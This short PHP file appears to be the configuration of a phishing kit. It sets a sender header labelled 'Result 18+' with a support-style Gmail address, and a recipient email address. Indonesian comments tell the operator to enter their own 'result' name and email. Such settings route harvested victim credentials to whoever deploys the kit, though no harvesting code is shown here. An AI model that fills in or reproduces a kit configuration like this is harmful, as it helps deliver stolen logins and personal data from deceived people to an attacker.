<?php

$sender = 'From: Result 18+ <support@gmail.com>'; // NAMA RESS KAMU

$email = 'cannelhost@gmail.com'; // EMAIL KAMU

?>